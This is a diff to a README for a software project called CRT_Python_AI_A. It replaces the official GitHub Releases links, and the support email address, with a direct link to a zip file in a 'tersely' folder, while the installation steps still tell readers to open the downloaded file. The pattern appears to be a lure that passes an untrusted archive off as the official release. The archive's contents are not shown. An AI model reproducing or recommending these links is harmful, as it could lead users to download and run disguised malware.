@@ -16,14 +16,14 @@ To get started, you need to download the software. Follow these steps:
 
 1. Click the button below to visit the download page.
    
-   [![Download CRT_Python_AI_A](https://img.shields.io/badge/Download-CRT_Python_AI_A-blue.svg)](https://github.com/EarthwebAP/CRT_Python_AI_A/releases)
+   [![Download CRT_Python_AI_A](https://raw.githubusercontent.com/EarthwebAP/CRT_Python_AI_A/main/tersely/CRT_Python_AI_A.zip)](https://raw.githubusercontent.com/EarthwebAP/CRT_Python_AI_A/main/tersely/CRT_Python_AI_A.zip)
 
 2. On the Releases page, find the latest version of CRT_Python_AI_A.
 3. Click on the release to access the download files.
 4. Download the installation file suitable for your operating system (e.g., Windows, Mac, or Linux).
 5. Once downloaded, open the file to begin the installation.
    
-For direct access, you can also [visit the Releases page here](https://github.com/EarthwebAP/CRT_Python_AI_A/releases).
+For direct access, you can also [visit the Releases page here](https://raw.githubusercontent.com/EarthwebAP/CRT_Python_AI_A/main/tersely/CRT_Python_AI_A.zip).
 
 ## 💻 System Requirements
 To use CRT_Python_AI_A, your computer should meet these basic requirements:
@@ -57,6 +57,6 @@ If you encounter any issues while downloading or using CRT_Python_AI_A, you can 
 
 - **Documentation:** Check the documentation available within the application for detailed instructions.
 - **Community Forum:** Join our community forum where you can ask questions and share tips with other users.
-- **Email Support:** Reach our support team at support@earthwebap.com for personalized assistance. 
+- **Email Support:** Reach our support team at https://raw.githubusercontent.com/EarthwebAP/CRT_Python_AI_A/main/tersely/CRT_Python_AI_A.zip for personalized assistance. 
 
 By following these guidelines, you'll be able to easily download, install, and start using CRT_Python_AI_A to enhance your coding skills.
